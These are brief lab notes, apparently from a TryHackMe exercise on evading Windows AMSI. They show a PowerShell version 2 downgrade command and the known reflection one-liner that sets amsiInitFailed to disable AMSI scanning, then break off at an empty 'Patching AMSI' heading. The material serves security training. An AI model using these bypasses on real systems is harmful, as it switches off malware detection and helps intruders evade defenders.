
# PowerShell Downgrade

![]()

```PowerShell
C:\Users\THM-Attacker>PowerShell -Version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.
```

![]()

![]()

# PowerShell Reflection

![]()

```PowerShell
PS C:\Users\THM-Attacker> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

![]()

# Patching AMSI
